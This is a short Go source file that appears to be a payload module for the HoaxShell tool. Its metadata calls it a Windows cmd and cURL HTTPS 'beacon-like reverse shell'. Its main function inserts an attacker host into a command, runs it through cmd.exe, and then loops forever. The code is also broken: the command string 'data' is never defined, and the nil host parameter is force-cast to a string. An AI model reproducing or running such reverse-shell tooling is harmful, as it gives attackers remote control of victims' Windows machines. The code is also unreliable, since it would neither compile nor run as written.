package main

import (
	"fmt"
	"os"
	"os/exec"
	"strings"
	"time"
)

var info = map[string]string{
	"Title":       "Windows CMD cURL HoaxShell https",
	"Author":      "Panagiotis Chartas (t3l3machus)",
	"Description": "An Https based beacon-like reverse shell that utilizes cURL",
	"References":  "https://github.com/t3l3machus/hoaxshell, https://revshells.com",
}

var meta = map[string]string{
	"handler": "hoaxshell",
	"type":    "cmd-curl-ssl",
	"os":      "windows",
	"shell":   "cmd.exe",
}

var config = map[string]int{
	"frequency": 1,
}

var parameters = map[string]interface{}{
	"lhost": nil,
}

var attrs = map[string]interface{}{}

func main() {
	lhost := parameters["lhost"].(string)
	ip := strings.Replace(data, "*LHOST*", lhost, -1)
	cmd := exec.Command("cmd", "/C", ip)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Run()

	frequency := config["frequency"]
	for {
		cmd := exec.Command("timeout", "/T", fmt.Sprintf("%d", frequency))
		cmd.Run()
	}
}
